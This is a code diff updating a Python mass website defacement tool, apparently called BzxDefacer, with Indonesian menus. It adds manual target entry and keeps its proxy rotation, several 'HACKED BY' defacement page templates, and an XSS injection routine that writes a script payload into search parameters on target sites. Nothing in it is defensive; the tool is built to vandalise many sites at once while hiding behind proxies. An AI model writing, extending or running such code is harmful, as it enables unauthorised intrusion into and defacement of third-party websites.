@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# BzdeepX MASS DEFACER - AUTO PROXY EDITION
+# BzxDefacer - Mass Defacer Auto Proxy Edition
 # https://github.com/bzdev1/defacer-bzx
 
 import requests
@@ -32,11 +32,11 @@ W = Fore.WHITE
 RS = Style.RESET_ALL
 
 # Banner keren
-banner_text = pyfiglet.figlet_format("BzdeepX", font="slant")
+banner_text = pyfiglet.figlet_format("BzxDefacer", font="slant")
 banner = f"{R}{banner_text}{RS}"
 banner += f"{C}══════════════════════════════════════════════════════════{RS}\n"
 banner += f"{W}         MASS DEFACER | AUTO PROXY | CUSTOM HTML{RS}\n"
-banner += f"{Y}         BzoneX™ Evolved | DEWA SPEK PREMIUM | v4.0{RS}\n"
+banner += f"{Y}         Bzx™ Evolution | DEWA SPEK PREMIUM | v4.1{RS}\n"
 banner += f"{C}══════════════════════════════════════════════════════════{RS}\n"
 
 class ProxyManager:
@@ -129,7 +129,7 @@ class ProxyManager:
             print(f"{R}[✗] Gagal simpan: {e}{RS}")
             return False
 
-class BzdeepXDefacer:
+class BzxDefacer:
     def __init__(self):
         self.targets = []
         self.live_targets = []
@@ -166,15 +166,60 @@ class BzdeepXDefacer:
         print(f"{C}│{G}  9. {W}Lihat Hasil (Log)                               {C}│{RS}")
         print(f"{C}│{G} 10. {W}Proxy Status & Management                       {C}│{RS}")
         print(f"{C}│{G} 11. {W}Bersihin Cache/Temp                             {C}│{RS}")
+        print(f"{C}│{G} 12. {W}Input Target Manual (Langsung Ketik)           {C}│{RS}")
         print(f"{C}│{R}  0. Exit                                           {C}│{RS}")
         print(f"{C}└─────────────────────────────────────────────────────┘{RS}")
         
-        # Tampilkan status proxy
+        # Tampilkan status proxy dan target
         proxy_status = f"{G}ON ({len(self.proxies)} live)" if self.use_proxy and self.proxies else f"{R}OFF"
         print(f"{Y}Proxy Status: {proxy_status}{RS}")
         if self.use_proxy and self.proxies:
             print(f"{Y}Live Proxies: {len(self.proxies)}{RS}")
+        print(f"{Y}Total Target: {len(self.targets)}{RS}")
         
+    def input_target_manual(self):
+        """Input target langsung dari keyboard"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+        print(f"{C}══════════════════ INPUT TARGET MANUAL ══════════════════{RS}")
+        print(f"{Y}Pilih mode input:{RS}")
+        print(f"{W}1. Satu baris (pisah pake koma){RS}")
+        print(f"{W}2. Satu per satu (ketik 'done' untuk selesai){RS}")
+        print(f"{R}0. Kembali{RS}")
+        print(f"{C}═══════════════════════════════════════════════════════{RS}")
+        
+        mode = input(f"{Y}Pilih mode: {RS}").strip()
+        
+        if mode == '0':
+            return
+        elif mode == '1':
+            targets_input = input(f"\n{Y}Masukkan target (pisah pake koma):\n{RS}").strip()
+            if targets_input:
+                target_list = [t.strip() for t in targets_input.split(',') if t.strip()]
+                self.targets.extend(target_list)
+                print(f"{G}[✓] {len(target_list)} target ditambahkan{RS}")
+        elif mode == '2':
+            print(f"\n{Y}Masukkan target satu per satu (ketik 'done' untuk selesai):{RS}")
+            count = 0
+            while True:
+                target = input(f"{G}Target {count+1}: {RS}").strip()
+                if target.lower() == 'done':
+                    break
+                if target:
+                    self.targets.append(target)
+                    count += 1
+                    print(f"{G}[✓] Target ditambahkan{RS}")
+            print(f"{G}[✓] Total {count} target ditambahkan{RS}")
+        
+        # Tampilkan preview
+        if self.targets:
+            print(f"\n{Y}Preview 5 target pertama:{RS}")
+            for i, t in enumerate(self.targets[:5], 1):
+                print(f"{G}{i}. {t}{RS}")
+            if len(self.targets) > 5:
+                print(f"{Y}... dan {len(self.targets)-5} lainnya{RS}")
+        
+        input(f"\n{Y}Press Enter untuk kembali...{RS}")
+    
     def auto_proxy_menu(self):
         """Menu auto proxy"""
         while True:
@@ -303,13 +348,13 @@ class BzdeepXDefacer:
         input(f"\n{Y}Press Enter untuk kembali...{RS}")
     
     def template_menu(self):
-        """Pilih template deface"""
+        """Pilih template deface - FIXED VERSION"""
         templates = {
-            '1': {'name': 'HACKED BASIC', 'html': '<html><head><title>HACKED</title></head><body bgcolor=black text=red><center><h1>💀 HACKED BY BzdeepX 💀</h1><blink>Your security is trash</blink></center></body></html>'},
+            '1': {'name': 'HACKED BASIC', 'html': '<html><head><title>HACKED</title></head><body bgcolor=black text=red><center><h1>💀 HACKED BY Bzx 💀</h1><blink>Your security is trash</blink></center></body></html>'},
             '2': {'name': 'ANONYMOUS STYLE', 'html': '<html><head><title>Anonymous Was Here</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:200px;}h1{font-size:50px;}blink{animation:blink 1s infinite;}@keyframes blink{0%{opacity:1;}50%{opacity:0;}}</style></head><body><h1>🔓 HACKED</h1><h2>We are Anonymous</h2><blink>🖕 Expect Us 🖕</blink></body></html>'},
-            '3': {'name': 'MATRIX THEME', 'html': '<html><head><title>Matrix Hacked</title><style>body{background:black;color:#00ff00;font-family:monospace;text-align:center;padding-top:150px;}.matrix{text-shadow:0 0 5px #0f0;}@keyframes glitch{2%,64%{transform:skew(0,0)}}</style></head><body><div class="matrix"><h1>⚠️ SYSTEM BREACHED ⚠️</h1><p>Follow the white rabbit</p><p>BzdeepX Owns This</p></div></body></html>'},
-            '4': {'name': 'PROTEST PAGE', 'html': '<html><head><title>Hacked - Protest</title></head><body bgcolor=white text=black><center><h1 style="color:red;">✊ HACKED ✊</h1><h3>This site has been defaced as a protest</h3><p>Fix your security or we\'ll be back</p><p>- BzdeepX</p></center></body></html>'},
-            '5': {'name': 'SKULL & BONES', 'html': '<html><head><title>💀 HACKED 💀</title><style>body{background:#111;color:#fff;text-align:center;padding-top:100px;}pre{color:#f00;font-size:20px;}</style></head><body><pre>         ______                 ______              ______\n        /      \\               /      \\            /      \\\n       |  💀  💀  |             |  💀  💀  |          |  💀  💀  |\n        \\  __  /               \\  __  /            \\  __  /\n         /    \\                 /    \\              /    \\\n        /      \\               /      \\            /      \\</pre><h1>HACKED BY BzdeepX</h1><h2>You got pwned!</h2></body></html>'},
+            '3': {'name': 'MATRIX THEME', 'html': '<html><head><title>Matrix Hacked</title><style>body{background:black;color:#00ff00;font-family:monospace;text-align:center;padding-top:150px;}.matrix{text-shadow:0 0 5px #0f0;}@keyframes glitch{2%,64%{transform:skew(0,0)}}</style></head><body><div class="matrix"><h1>⚠️ SYSTEM BREACHED ⚠️</h1><p>Follow the white rabbit</p><p>Bzx Owns This</p></div></body></html>'},
+            '4': {'name': 'PROTEST PAGE', 'html': '<html><head><title>Hacked - Protest</title></head><body bgcolor=white text=black><center><h1 style="color:red;">✊ HACKED ✊</h1><h3>This site has been defaced as a protest</h3><p>Fix your security or we\'ll be back</p><p>- Bzx</p></center></body></html>'},
+            '5': {'name': 'SKULL & BONES', 'html': '<html><head><title>💀 HACKED 💀</title><style>body{background:#111;color:#fff;text-align:center;padding-top:100px;}pre{color:#f00;font-size:20px;}</style></head><body><pre>         ______                 ______              ______\n        /      \\               /      \\            /      \\\n       |  💀  💀  |             |  💀  💀  |          |  💀  💀  |\n        \\  __  /               \\  __  /            \\  __  /\n         /    \\                 /    \\              /    \\\n        /      \\               /      \\            /      \\</pre><h1>HACKED BY Bzx</h1><h2>You got pwned!</h2></body></html>'},
         }
         
         while True:
@@ -329,7 +374,7 @@ class BzdeepXDefacer:
                 
                 # Preview
                 print(f"\n{Y}Preview:{RS}")
-                print(f"{self.deface_html}")
+                print(f"{self.deface_html[:200]}...")
                 
                 save = input(f"\n{Y}Simpan ke file? (y/N): {RS}").strip().lower()
                 if save == 'y':
@@ -425,11 +470,11 @@ class BzdeepXDefacer:
         """Load list target dari file"""
         try:
             with open(file, 'r') as f:
-                self.targets = [line.strip() for line in f if line.strip()]
-            print(f"{G}[✓] Loaded {len(self.targets)} targets{RS}")
+                file_targets = [line.strip() for line in f if line.strip()]
+                self.targets.extend(file_targets)
+            print(f"{G}[✓] Loaded {len(file_targets)} targets dari file{RS}")
         except:
             print(f"{R}[✗] Gagal load file{RS}")
-            self.targets = []
     
     def load_proxies(self, file):
         """Load proxy list dari file"""
@@ -724,8 +769,8 @@ class BzdeepXDefacer:
         return None
     
     def _inject_javascript(self, url):
-        """Inject JavaScript via XSS"""
-        js_payload = f"<script>document.write('{self.deface_html.replace('"', '\\"')}');</script>"
+        """Inject JavaScript via XSS - FIXED VERSION"""
+        js_payload = "<script>document.write('{}');</script>".format(self.deface_html.replace('"', '\\"'))
         
         xss_points = [
             f"/search?q={js_payload}",
@@ -785,11 +830,11 @@ class BzdeepXDefacer:
     def run(self):
         """Jalankan mass defacer"""
         if not self.targets:
-            print(f"{R}[!] Load target dulu!{RS}")
+            print(f"{R}[!] Load target dulu! (Menu 1 atau 12){RS}")
             return
         
         if not self.deface_html:
-            print(f"{R}[!] Load/pilih HTML deface dulu!{RS}")
+            print(f"{R}[!] Load/pilih HTML deface dulu! (Menu 4 atau 5){RS}")
             return
         
         queue = Queue()
@@ -797,6 +842,7 @@ class BzdeepXDefacer:
             queue.put(target)
         
         print(f"\n{Y}[*] Starting mass deface with {self.threads} threads...{RS}\n")
+        print(f"{Y}Total target: {len(self.targets)}{RS}")
         
         # Reset counter
         self.success = 0
@@ -845,17 +891,23 @@ class BzdeepXDefacer:
     def clean_cache(self):
         """Bersihin file temporary"""
         files = ['defaced.log', 'vulnerable.txt', 'custom.html', 'template_*.html']
-        for f in files:
-            os.system(f"rm -f {f}")
+        for pattern in files:
+            if '*' in pattern:
+                os.system(f"rm -f {pattern}")
+            else:
+                try:
+                    os.remove(pattern)
+                except:
+                    pass
         print(f"{G}[✓] Cache & temp files cleaned{RS}")
         time.sleep(1)
 
 def main():
-    defacer = BzdeepXDefacer()
+    defacer = BzxDefacer()
     
     while True:
         defacer.show_menu()
-        choice = input(f"{Y}Pilih menu [0-11]: {RS}").strip()
+        choice = input(f"{Y}Pilih menu [0-12]: {RS}").strip()
         
         if choice == '1':
             file = input(f"{Y}File target list (targets.txt): {RS}").strip() or 'targets.txt'
@@ -893,6 +945,9 @@ def main():
             
         elif choice == '11':
             defacer.clean_cache()
+            
+        elif choice == '12':
+            defacer.input_target_manual()
             
         elif choice == '0':
             print(f"{R}[!] Exiting...{RS}")
